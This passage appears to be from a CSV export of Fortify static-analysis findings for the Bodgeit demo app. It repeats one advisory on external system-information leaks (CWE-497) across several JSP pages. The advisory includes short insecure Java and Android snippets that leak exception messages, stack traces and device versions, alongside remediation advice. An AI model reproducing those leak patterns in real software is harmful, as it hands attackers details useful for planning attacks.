<b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","214","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/home.jsp","","","http://localhost/root/home.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","185","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/login.jsp","","","http://localhost/root/login.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","193","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/product.jsp","","","http://localhost/root/product.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","138","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/register.jsp","","","http://localhost/root/register.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","206","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/score.jsp","","","http://localhost/root/score.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","197","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/search.jsp","","","http://localhost/root/search.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
